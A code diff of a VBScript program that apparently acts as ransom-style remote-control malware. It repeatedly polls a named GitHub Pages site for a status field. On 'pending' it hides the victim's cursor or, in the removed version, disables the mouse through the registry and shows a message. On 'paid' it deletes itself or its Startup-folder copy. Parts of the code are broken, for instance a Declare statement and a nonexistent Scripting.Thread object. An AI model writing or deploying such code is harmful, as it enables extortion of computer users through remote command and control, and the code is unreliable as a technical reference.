@@ -1,95 +1,69 @@
 Option Explicit
 
+' Import the necessary Windows API functions
+Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
+
 Dim delay
-delay = 1 ' Delay between each execution (in seconds)
+delay = 1
 
 Dim url
-url = "https://tanjim750.github.io/remotecontrol/" ' Replace with the URL of your website
+url = "https://tanjim750.github.io/remotecontrol/"
 
-Dim loopFlag
-loopFlag = True
+Dim loopCondition
+loopCondition = True
 
-While loopFlag
-    Dim response
-    On Error Resume Next ' Ignore any errors during HTTP request
-    Dim xmlhttp
-    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
-    xmlhttp.Open "GET", url, False
-    xmlhttp.Send
-    response = xmlhttp.responseText
-    On Error Goto 0 ' Turn off error handling
+Do While loopCondition
+    Dim response, status_input, text_input, status_value, text
+    Set response = CreateObject("MSXML2.XMLHTTP")
     
-    If Err.Number = 0 Then
-        Dim doc
-        Set doc = CreateObject("HTMLFile")
-        doc.write response
+    On Error Resume Next
+    response.open "GET", url, False
+    response.send
+    On Error Goto 0
+    
+    If response.status = 200 Then
+        Dim html
+        html = response.responseText
         
-        Dim statusValue
-        Dim statusInput
-        Set statusInput = doc.getElementById("status1")
-        If Not statusInput Is Nothing Then
-            statusValue = statusInput.value
+        Dim htmlDocument
+        Set htmlDocument = CreateObject("HTMLFile")
+        htmlDocument.write html
+        htmlDocument.close
+        
+        Set status_input = htmlDocument.getElementById("status")
+        Set text_input = htmlDocument.getElementById("text")
+        
+        If Not status_input Is Nothing Then
+            status_value = status_input.value
         End If
         
-        Dim text
-        Dim textInput
-        Set textInput = doc.getElementById("text1")
-        If Not textInput Is Nothing Then
-            text = textInput.innerText
-        End If
-        
-        If statusValue = "pending" Then
-            Dim shell
-            Set shell = CreateObject("WScript.Shell")
-            
-            Dim mouseDisabled
-            mouseDisabled = False
-            
-            ' Function to display the message
-            Sub DisplayMessage()
-                shell.Popup text, 0, "Message", vbInformation
-                
-                ' Re-enable the mouse if it was disabled
-                If mouseDisabled Then
-                    shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d 0 /f", 0, True
-                End If
-            End Sub
-            
-            ' Function to disable the mouse
-            Sub DisableMouse()
-                mouseDisabled = True
-                shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d -1 /f", 0, True
-            End Sub
-            
-            ' Run the DisplayMessage and DisableMouse functions in separate threads
-            Dim displayThread
-            Set displayThread = CreateObject("Scripting.Thread")
-            displayThread.CodeObject = GetRef("DisplayMessage")
-            displayThread.Start
-            
-            Dim disableMouseThread
-            Set disableMouseThread = CreateObject("Scripting.Thread")
-            disableMouseThread.CodeObject = GetRef("DisableMouse")
-            disableMouseThread.Start
-        ElseIf statusValue = "loop" Then
-            loopFlag = True
-        ElseIf statusValue = "donotexecute" Then
-            loopFlag = False
-        ElseIf statusValue = "paid" Then
-            Dim fso
-            Set fso = CreateObject("Scripting.FileSystemObject")
-            Dim startupPath
-            startupPath = shell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
-            Dim startupScriptPath
-            startupScriptPath = fso.BuildPath(startupPath, "startapp.vbs")
-            If fso.FileExists(startupScriptPath) Then
-                fso.DeleteFile startupScriptPath
-            End If
-            Exit Do
-        Else
-            loopFlag = True
+        If Not text_input Is Nothing Then
+            text = text_input.innerText
         End If
     End If
     
-    WScript.Sleep delay * 1000 ' Delay in milliseconds
-Wend
+    If status_value = "pending" Then
+        ShowCursor False
+        
+    ElseIf status_value = "loop" Then
+       loopCondition = True
+        
+    ElseIf status_value = "donotexecute" Then
+    	ShowCursor True
+        WScript.Quit
+        
+    ElseIf status_value = "paid" Then
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+		' Get the path of the current VBScript file
+		filePath = WScript.ScriptFullName
+
+		' Delete the file
+		objFSO.DeleteFile(filePath)
+        
+    Else
+        loopCondition = True
+    End If
+    
+    WScript.Sleep (3000) ' Delay in milliseconds
+Loop
